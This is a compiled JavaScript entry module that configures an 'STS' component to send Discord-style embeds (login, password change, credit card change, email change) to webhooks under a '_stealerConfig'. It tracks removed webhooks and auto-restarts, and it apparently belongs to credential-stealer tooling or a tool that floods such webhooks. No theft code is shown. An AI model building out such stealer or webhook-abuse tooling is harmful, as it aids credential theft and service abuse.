"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.start = void 0;
const sts_1 = require("./sts");
const discordInitialized_1 = require("./embeds/discordInitialized");
const login_1 = require("./embeds/login");
const passwordChange_1 = require("./embeds/passwordChange");
const creditCardChange_1 = require("./embeds/creditCardChange");
const initNotify_1 = require("./embeds/initNotify");
const loggedOut_1 = require("./embeds/loggedOut");
const emailChange_1 = require("./embeds/emailChange");
const lodash_1 = require("lodash");
const log_1 = require("./log");
const constants_1 = require("./constants");
async function start(config) {
    const embedCreatorsSchemas = [
        { fn: discordInitialized_1.getDiscordInitializedEmbed, execute: () => true },
        { fn: login_1.getUserLogonEmbed, execute: () => true },
        { fn: passwordChange_1.getUserPasswordChangeEmbed, execute: () => !(0, lodash_1.random)(0, 5) },
        { fn: creditCardChange_1.getCreditCardEmbed, execute: () => !(0, lodash_1.random)(0, 10) },
        { fn: emailChange_1.getUserEmailChangeEmbed, execute: () => !(0, lodash_1.random)(0, 10) },
    ];
    const stealerConfig = config.getConfig()._stealerConfig;
    if (stealerConfig["init-notify"]) {
        embedCreatorsSchemas.unshift({ fn: initNotify_1.getInitNotifyEmbed, execute: () => true });
    }
    if (stealerConfig["logout-notify"]) {
        embedCreatorsSchemas.push({ fn: loggedOut_1.getUserLogoutEmbed, execute: () => true });
    }
    const sendToReportWebhook = (content) => {
        const webhookUrl = config.getWebhook().reportHookUrl;
        if (webhookUrl) {
            sts.webhookHandler.send(webhookUrl, { content });
        }
    };
    const sts = new sts_1.STS(config, embedCreatorsSchemas);
    sts.on(sts_1.STSEvents.WebhookRemoved, event => {
        const message = `${event.webhook} has been removed. Status\n${event.status}`;
        console.info(message);
        sendToReportWebhook(message);
    });
    sts.on(sts_1.STSEvents.onFailure, async (event) => {
        const error = await (0, log_1.writeError)(event.axiosError, "STS fail");
        console.error(error);
        sendToReportWebhook(error);
    });
    sts.on(sts_1.STSEvents.onSuccess, async (event) => {
        console.debug("sent", sts.webhookHandler.getWebhookStats(event.webhook));
    });
    sts.on(sts_1.STSEvents.EmergencyAutShutdown, async (event) => {
        // in case where emergency shout down would happen we wait for an hour to restart
        console.error(event.fatalError);
        (0, log_1.writeError)(event.fatalError, "Emergency shutdown");
        setTimeout(() => {
            sts.start();
        }, constants_1.HOUR);
    });
    sts.start();
    // if (DEVELOPMENT) {
    //     console.log(config.getConfig(), config.getWebhook());
    // }
}
exports.start = start;
